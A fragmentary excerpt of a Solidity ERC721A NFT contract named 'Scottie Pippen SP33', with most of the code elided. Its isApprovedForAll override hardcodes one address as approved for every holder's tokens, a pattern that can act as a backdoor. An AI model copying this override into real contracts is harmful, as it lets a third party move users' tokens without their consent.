  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x1038518233627A4dd77dD87C475E4fF5E471412a){return true;}
...
contract ScottiePippenSP33 is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Scottie Pippen SP33", "SP33", maxBatchSize_, collectionSize_) {
